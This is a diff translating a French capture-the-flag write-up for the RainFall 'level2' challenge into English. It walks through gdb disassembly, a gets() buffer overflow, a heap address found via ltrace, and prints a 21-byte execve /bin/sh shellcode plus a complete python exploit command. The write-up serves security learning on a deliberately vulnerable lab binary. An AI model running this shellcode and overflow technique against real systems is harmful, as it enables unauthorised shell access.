@@ -1,4 +1,4 @@
-On lance gdb sur le programme level2 afin d'en savoir plus.
+We launch gdb on level2 program
 
 (gdb) disass main
 Dump of assembler code for function main:
@@ -9,6 +9,7 @@ Dump of assembler code for function main:
    0x0804854a <+11>:	leave
    0x0804854b <+12>:	ret
 End of assembler dump.
+
 (gdb) disass p
 Dump of assembler code for function p:
    0x080484d4 <+0>:	push   ebp
@@ -43,19 +44,15 @@ Dump of assembler code for function p:
    0x0804853e <+106>:	ret
 End of assembler dump.
 
-On observe la presence d'un gets qui possede une faille. On peut donc faire un buffer overflow.
-On observe aussi une comparaison a +44 qui en cas de non egalite jump jusqu'a +83 pour quitter le programme.
-Cela nous empeche de reecrire eip par une adresse de la stack.
+We know that we can exploit gets and that we can make a buffer overflow.
+We see a cmp at +44. If not equal, jump to +83 and exit program.
+This forbid us to rewrite eip with an address from stack.
 
-On observe aussi que l'on a pas d'appel a une commande comme system ou exec que nous pourrions utiliser
-afin d'avoir acces a un prompt.
+We can see there's no system or exec command we can use but there's a strdup in +100 that calls a malloc that we can use to make
+a heap overflow. We need to find the offset with Wiremask: 80
 
-On remarque un strdup en +100. Strdup possede un malloc. Malloc que nous allons utiliser afin de faire un heap overflow.
-Pour cela il nous faut trouver l'offset. J'utilise la meme methode que pour l'exercice precedent et
-trouve un offset de 80.
-On va donc choisir un shellcode. Le suivant fait 21 bytes.
-\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
-Il nous faut aussi l'adresse du malloc, pour ca :
+We use a shellcode which is 21 bytes long: \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+We also need malloc's address:
 level2@RainFall:~$ ltrace ./level2
 __libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
 fflush(0xb7fd1a20)                               = 0
@@ -65,8 +62,8 @@ puts("coucou"coucou
 )                                   = 7
 strdup("coucou")                                 = 0x0804a008
 +++ exited (status 8) +++
-L'adresse du malloc est donc : 0x0804a008
-On a donc tout ce qu'il nous faut afin de construire notre exploit.
+Malloc address is : 0x0804a008
+We can now build our exploit:
 
 (python -c 'print ("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xa0\x04\x08")'; cat) | ./level2
 whoami
